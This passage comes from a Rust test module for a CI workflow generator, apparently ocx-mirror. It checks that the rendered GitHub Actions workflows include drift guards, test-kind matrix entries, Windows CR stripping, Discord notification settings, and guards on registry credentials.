            let verify = dir.path().join(".github/workflows/shfmt.verify-generated.yml");
            assert!(verify.exists(), "verify-generated.yml must be emitted by default");
            let content = std::fs::read_to_string(&verify).unwrap();
            assert!(content.contains("DO NOT EDIT"), "must carry the DO-NOT-EDIT header");
            assert!(
                content.contains("uses: ocx-sh/setup-ocx@"),
                "drift guard must install ocx via the setup-ocx action"
            );
            assert!(
                content.contains("ocx-mirror package pipeline generate ci --check"),
                "drift guard must run `generate ci --check` directly (no `ocx run --`)"
            );
            assert!(
                content.contains("pull_request:"),
                "drift guard must trigger on pull_request"
            );
        }
    }

    #[test]
    fn verify_generated_emitted_by_default_in_render_map() {
        // Field absent → default false → drift guard present in the render map.
        let spec = spec_from_yaml(SHFMT_SPEC);
        let files = render(&spec, "mirror.yml").unwrap();
        assert!(
            files.contains_key(Path::new(".github/workflows/shfmt.verify-generated.yml")),
            "verify-generated.yml must be in the render map by default"
        );
    }

    #[test]
    fn allow_manual_edits_skips_verify_generated() {
        // Opt-out: `allow_manual_edits: true` drops the drift guard but keeps the
        // two primary generated workflows.
        let spec = spec_from_yaml(&format!("{SHFMT_SPEC}allow_manual_edits: true\n"));
        let files = render(&spec, "mirror.yml").unwrap();
        assert!(
            files.contains_key(Path::new(".github/workflows/shfmt.yml")),
            "mirror.yml must still be rendered when opting out"
        );
        assert!(
            files.contains_key(Path::new(".github/workflows/shfmt.describe.yml")),
            "describe.yml must still be rendered when opting out"
        );
        assert!(
            !files.contains_key(Path::new(".github/workflows/shfmt.verify-generated.yml")),
            "verify-generated.yml must be skipped when allow_manual_edits is true"
        );
    }

    #[test]
    fn check_mode_detects_verify_generated_drift() {
        // A hand-edit to verify-generated.yml itself must be caught by `--check`.
        let dir = tempdir().unwrap();
        let fixture_src = Path::new(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/mirror-minimal.yml"
        ));
        let spec_dest = dir.path().join("mirror-minimal.yml");
        std::fs::copy(fixture_src, &spec_dest).unwrap();

        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        let rt = tokio::runtime::Runtime::new().unwrap();

        let write_result = rt.block_on(async {
            let cmd = GenerateCi {
                spec: spec_dest.clone(),
                check: false,
                format: None,
            };
            cmd.execute(&printer).await
        });

        if write_result.is_ok() {
            let verify_path = dir.path().join(".github/workflows/shfmt.verify-generated.yml");
            assert!(verify_path.exists(), "verify-generated.yml must have been written");
            let mut content = std::fs::read_to_string(&verify_path).unwrap();
            content.push_str("\n# drift injection\n");
            std::fs::write(&verify_path, content).unwrap();

            let check_result = rt.block_on(async {
                let cmd = GenerateCi {
                    spec: spec_dest,
                    check: true,
                    format: None,
                };
                cmd.execute(&printer).await
            });

            match check_result {
                Err(MirrorError::RendererDrift(paths)) => {
                    assert!(
                        paths.iter().any(|p| p.contains("verify-generated.yml")),
                        "drift must call out verify-generated.yml: {paths:?}"
                    );
                }
                Ok(()) => panic!("expected drift detection for verify-generated.yml mutation"),
                Err(e) => panic!("expected RendererDrift, got: {e}"),
            }
        }
    }

    #[test]
    fn verify_generated_template_runs_check_command() {
        let template = super::VERIFY_GENERATED_TEMPLATE;
        assert!(
            template.contains("ocx-mirror package pipeline generate ci --check"),
            "drift-guard template must invoke `generate ci --check`"
        );
        assert!(
            template.contains("DO NOT EDIT"),
            "drift-guard template must carry the DO-NOT-EDIT header"
        );
    }

    // ── §TestEntry union: CI render tests ──────────────────────────────────────

    /// Build a `MirrorSpec` from inline YAML and call `build_matrix` on it.
    fn build_matrix_from_yaml(yaml: &str) -> Vec<MatrixLeg> {
        let spec: crate::spec::MirrorSpec = serde_yaml_ng::from_str(yaml).unwrap();
        build_matrix(&spec)
    }

    #[test]
    fn render_matrix_entries_emits_kind_command() {
        // A spec with `command:` must produce `kind: command` + `command: <value>` in matrix.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("kind: command"),
                "matrix entry for command test must contain 'kind: command'; content:\n{content}"
            );
            assert!(
                content.contains("command: shfmt --version"),
                "matrix entry must contain 'command: shfmt --version'; content:\n{content}"
            );
        }
    }

    #[test]
    fn render_matrix_entries_emits_kind_script() {
        // A spec with `script:` must produce `kind: script` + `script: <path>` in matrix.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-all-test-kinds.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("kind: script"),
                "matrix entry for script test must contain 'kind: script'; content:\n{content}"
            );
            assert!(
                content.contains("script: tests/smoke.star"),
                "matrix entry must contain 'script: tests/smoke.star'; content:\n{content}"
            );
        }
    }

    #[test]
    fn render_matrix_entries_emits_kind_script_inline() {
        // A spec with `script_inline:` must produce `kind: script_inline` with YAML
        // block scalar (`script_inline: |`) in the matrix entry.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-all-test-kinds.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("kind: script_inline"),
                "matrix entry for inline test must contain 'kind: script_inline'; content:\n{content}"
            );
            assert!(
                content.contains("script_inline: |"),
                "inline test payload must use YAML block scalar ('script_inline: |'); content:\n{content}"
            );
        }
    }

    #[test]
    fn render_all_three_kinds_in_single_spec() {
        // All three kinds must co-exist in the same matrix.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-all-test-kinds.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(content.contains("kind: command"), "command kind missing");
            assert!(content.contains("kind: script"), "script kind missing");
            assert!(content.contains("kind: script_inline"), "script_inline kind missing");
        }
    }

    #[test]
    fn shell_loop_branches_on_test_kind() {
        // The generated shell loop must extract TEST_KIND and branch on its
        // value (command / script / script_inline). Native-only after the
        // setup-ocx migration — container path is exercised via the upstream
        // rejection test (`render_rejects_container_legs_with_usage_error`).
        let legs = build_matrix_from_yaml(
            r#"
name: shfmt
target:
  registry: ocx.sh
  repository: shfmt
source:
  type: github_release
  owner: mvdan
  repo: sh
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "shfmt_v.*_linux_amd64$"
asset_type:
  type: binary
  name: shfmt
tests:
  - name: version
    command: shfmt --version
  - name: smoke
    script: tests/smoke.star
  - name: inline
    script_inline: |
      ocx_assert(True)
platforms:
  linux/amd64:
    runner: ubuntu-latest
ocx_mirror:
  release_tag: v0.7.2
"#,
        );
        let shell_block = render_test_run_steps(&legs, false);

        // Must extract TEST_KIND.
        assert!(
            shell_block.contains("TEST_KIND=$(echo \"${TESTS_JSON}\" | jq -r \".[$i].kind\")"),
            "shell loop must extract TEST_KIND; block:\n{shell_block}"
        );
        // Must branch on command.
        assert!(
            shell_block.contains("if [ \"${TEST_KIND}\" = \"command\" ]"),
            "shell loop must have command branch; block:\n{shell_block}"
        );
        // Must branch on script.
        assert!(
            shell_block.contains("elif [ \"${TEST_KIND}\" = \"script\" ]"),
            "shell loop must have script branch; block:\n{shell_block}"
        );
        // Must handle script_inline via else branch (includes printf piped to --script -).
        assert!(
            shell_block.contains("--script -"),
            "shell loop must pipe script_inline to --script -; block:\n{shell_block}"
        );
        // Native script: uses --script $TEST_SCRIPT (not -c).
        assert!(
            shell_block.contains("--script \"${TEST_SCRIPT}\""),
            "native script branch must pass --script; block:\n{shell_block}"
        );
        // Every `ocx package test` invocation in the loop is called directly —
        // setup-ocx activates the project toolchain onto PATH for the step.
        assert!(
            shell_block.contains("ocx package test"),
            "every ocx package test invocation must be called directly (no `ocx run --`); block:\n{shell_block}"
        );
        assert!(
            !shell_block.contains("ocx run"),
            "test loop must not wrap `ocx package test` in `ocx run`; block:\n{shell_block}"
        );
        // No leftover docker injection from the previous container shape.
        assert!(
            !shell_block.contains("docker run"),
            "native-only renderer must not emit any `docker run` lines; block:\n{shell_block}"
        );
    }

    // Regression: native jq.exe on Windows runners emits CRLF, so without
    // `tr -d '\r'` after each jq pipeline in the test job the captured
    // `${VERSION}` carried a trailing CR and corrupted bundle paths
    // (e.g. `bundles/bundle-3.10.0\r-windows_amd64.tar.xz`).
    #[test]
    fn workflow_template_strips_cr_after_jq_for_windows_runners() {
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("jq -r '.[].version' | tr -d '\\r'"),
            "test job must strip CR from jq output to survive Git Bash + native jq.exe on Windows"
        );
        assert!(
            template.contains("head -n1 | tr -d '\\r' || true"),
            "CI_JOB_URL capture must strip CR before exporting the URL"
        );
    }

    // ── Per-version platform-set filter in the test loop ──────────────────────

    #[test]
    fn workflow_test_loop_skips_versions_outside_platform_set() {
        // The test loop must skip versions whose declared platform set excludes
        // this matrix leg's platform — fixes the backfill-partial false-red and
        // never re-tests out-of-window / excluded `(V, P)` pairs.
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("select(.version == $v) | .platforms | index($p)"),
            "test loop must membership-check matrix.platform against the version's platform set"
        );
        assert!(
            template.contains("if [ -z \"${IN_SET}\" ]; then"),
            "test loop must `continue` when the platform is not in the version's set"
        );
    }

    // ── Discord user-id env injection ─────────────────────────────────────────

    const NOTIFY_SPEC_WITH_USER_ID: &str = r#"
name: shfmt
target:
  registry: ocx.sh
  repository: shfmt
source:
  type: github_release
  owner: mvdan
  repo: sh
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "shfmt_v.*_linux_amd64$"
asset_type:
  type: binary
  name: shfmt
platforms:
  linux/amd64:
    runner: ubuntu-latest
notify:
  discord:
    webhook_secret: DISCORD_WEBHOOK_URL
    user_id: "123456789012345678"
"#;

    #[test]
    fn render_injects_discord_user_id_into_notify_env() {
        let spec = spec_from_yaml(NOTIFY_SPEC_WITH_USER_ID);
        let workflow = render_workflow(&spec, "mirror.yml", "mirror.yml");
        assert!(
            workflow.contains("OCX_MIRROR_DISCORD_USER_ID: \"123456789012345678\""),
            "notify env must inline the configured user id; workflow:\n{workflow}"
        );
        // The hook secret line and the user-id line both live in the notify env.
        assert!(workflow.contains("OCX_MIRROR_DISCORD_HOOK: ${{ secrets.DISCORD_WEBHOOK_URL }}"));
    }

    #[test]
    fn render_omits_discord_user_id_when_unset() {
        let spec = spec_from_yaml(SHFMT_SPEC);
        let workflow = render_workflow(&spec, "mirror.yml", "mirror.yml");
        assert!(
            !workflow.contains("OCX_MIRROR_DISCORD_USER_ID"),
            "no user-id env line when user_id is unset"
        );
        assert!(
            !workflow.contains("{DISCORD_USER_ID_ENV}"),
            "the user-id placeholder must always be substituted"
        );
    }

    // ── No-credentials guard: push job ─────────────────────────────────────────

    #[test]
    fn push_job_has_detect_credentials_step() {
        // The push job must emit a 'Detect registry credentials' step with
        // id: creds that probes OCX_MIRROR_REGISTRY_TOKEN via env-var injection
        // without echoing the secret value.
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("name: Detect registry credentials"),
            "push job must contain 'Detect registry credentials' step"
        );
        assert!(
            template.contains("id: creds"),
            "credentials-detect step must have id: creds"
        );
        assert!(
            template.contains("OCX_MIRROR_REGISTRY_TOKEN: ${{ secrets.OCX_MIRROR_REGISTRY_TOKEN }}"),
            "credentials-detect step must inject secret as env var (not echo it)"
        );
        assert!(
            template.contains("echo \"have=true\" >> \"${GITHUB_OUTPUT}\""),
            "credentials-detect step must set have=true output when token present"
        );
        assert!(
            template.contains("echo \"have=false\" >> \"${GITHUB_OUTPUT}\""),
            "credentials-detect step must set have=false output when token absent"
        );
        assert!(
            template.contains("::notice::No OCX_MIRROR_REGISTRY_TOKEN secret"),
            "credentials-detect step must emit a notice annotation when no secret"
        );
    }

    #[test]
    fn push_job_login_step_has_creds_guard() {
        // The docker-login step in the push job must be guarded so it is skipped
        // when no credentials are present.
        let template = super::WORKFLOW_TEMPLATE;
        // The login step and its guard must both be present in the template.
        assert!(
            template.contains("if: ${{ steps.creds.outputs.have == 'true' }}"),
            "at least one step in push job must carry if: steps.creds.outputs.have == 'true' guard"
        );
    }

    #[test]
    fn push_job_push_step_has_creds_guard() {
        // The 'Push' step (ocx-mirror package pipeline push) must also be guarded so the
        // run-summary.json is only written when credentials are available.
        let template = super::WORKFLOW_TEMPLATE;
        // Count occurrences: both login and push steps must have the guard.
        let guard = "if: ${{ steps.creds.outputs.have == 'true' }}";
        let count = template.matches(guard).count();
        assert!(
            count >= 2,
            "both login and push steps must carry the creds guard; found {count} occurrence(s)"
        );
    }

    #[test]
    fn push_job_has_no_creds_fallback_step() {
        // When credentials are absent the push step is skipped, so run-summary.json
        // is never written. A fallback step must emit safe defaults so the notify
        // job's conditional evaluates cleanly to false rather than erroring.
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("id: summarise-no-creds"),
            "push job must have a fallback summarise-no-creds step"
        );
        assert!(
            template.contains("steps.creds.outputs.have != 'true'"),
            "fallback step must be guarded with steps.creds.outputs.have != 'true'"
        );
        assert!(
            template.contains("any_new_green=false"),
            "fallback step must emit any_new_green=false"
        );
        assert!(
            template.contains("any_red=false"),
            "fallback step must emit any_red=false"
        );
    }

    // ── No-credentials guard: describe workflow ─────────────────────────────────

    #[test]
    fn describe_workflow_has_detect_credentials_step() {
        // describe.yml must also guard the docker-login so a repo with no secrets
        // goes green on the describe job.
        let template = super::DESCRIBE_TEMPLATE;
        assert!(
            template.contains("name: Detect registry credentials"),
            "describe workflow must contain 'Detect registry credentials' step"
        );
        assert!(
            template.contains("id: creds"),
            "describe credentials-detect step must have id: creds"
        );
        assert!(
            template.contains("OCX_MIRROR_REGISTRY_TOKEN: ${{ secrets.OCX_MIRROR_REGISTRY_TOKEN }}"),
            "describe credentials-detect step must inject secret as env var"
        );
    }

    #[test]
    fn describe_workflow_login_and_publish_steps_have_creds_guard() {
        // Both the docker-login and the 'Publish catalog metadata' step in
        // describe.yml must carry the creds guard.
        let template = super::DESCRIBE_TEMPLATE;
        let guard = "if: ${{ steps.creds.outputs.have == 'true' }}";
        let count = template.matches(guard).count();
        assert!(
            count >= 2,
            "describe workflow must guard both login and publish steps; found {count} occurrence(s)"
        );
    }

    #[test]
    fn rendered_workflow_contains_detect_step_and_guards() {
        // End-to-end: render from a fixture and assert the generated workflow.yml
        // carries the credential-detect step and the guards.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("Detect registry credentials"),
                "rendered mirror.yml must contain 'Detect registry credentials' step"
            );
            assert!(
                content.contains("id: creds"),
                "rendered mirror.yml must contain 'id: creds'"
            );
            assert!(
                content.contains("steps.creds.outputs.have == 'true'"),
                "rendered mirror.yml must contain creds guard on login/push steps"
            );
            assert!(
                content.contains("summarise-no-creds"),
                "rendered mirror.yml must contain no-creds fallback summarise step"
            );
        }
    }

    #[test]
    fn rendered_workflow_prepare_consumes_plan_artifact() {
        // Regression (issue #160): the prepare matrix legs must consume the
        // plan artifact (`--plan plan.json`) instead of re-running the source
        // generator — N+1 concurrent crawls exhausted the GitHub GraphQL
        // points budget. discover uploads the plan; prepare downloads it.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("name: plan\n          path: plan.json"),
                "discover must upload plan.json as the 'plan' artifact"
            );
            assert!(
                content.contains("--plan plan.json"),
                "prepare must pass --plan plan.json so the source is never re-crawled"
            );
            assert!(
                content.contains("jq -c '[.versions[] | {version, platforms, kind}]'"),
                "versions output must be projected so asset URLs stay out of the matrix JSON"
            );
        }
    }

    #[test]
    fn rendered_pipeline_commands_thread_spec_file() {
        // Regression: with per-app workflow filenames the spec is no longer the
        // default `./mirror.yml`, so every pipeline job command (plan/prepare/
        // push) MUST pass `--spec {SPEC_FILE}`. An unqualified `pipeline plan`
        // reds discover with SpecNotFound (69) — the exact failure that broke the
        // first multi-app corpus run.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let content = std::fs::read_to_string(dir.path().join(".github/workflows/shfmt.yml")).unwrap();
            assert!(
                content.contains("pipeline plan --spec mirror-minimal.yml"),
                "discover `plan` must pass --spec <spec-file>:\n{content}"
            );
            assert!(
                content.contains("pipeline prepare --spec mirror-minimal.yml"),
                "prepare must pass --spec <spec-file>:\n{content}"
            );
            // push spans multiple lines (backslash continuation); assert the flag
            // lands on the push invocation without pinning the exact wrapping.
            assert!(
                content.contains("pipeline push \\\n            --spec mirror-minimal.yml"),
                "push must pass --spec <spec-file>:\n{content}"
            );
        }
    }

    #[test]
    fn rendered_describe_contains_detect_step_and_guards() {
        // End-to-end: render from a fixture and assert the generated describe.yml
        // carries the credential-detect step and the guards.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let describe = dir.path().join(".github/workflows/shfmt.describe.yml");
            let content = std::fs::read_to_string(&describe).unwrap();
            assert!(
                content.contains("Detect registry credentials"),
                "rendered describe.yml must contain 'Detect registry credentials' step"
            );
            assert!(
                content.contains("steps.creds.outputs.have == 'true'"),
                "rendered describe.yml must guard both login and publish steps"
            );
            let guard = "steps.creds.outputs.have == 'true'";
            let count = content.matches(guard).count();
            assert!(
                count >= 2,
                "rendered describe.yml must have guard on both login and publish steps; found {count}"
            );
        }
    }
}
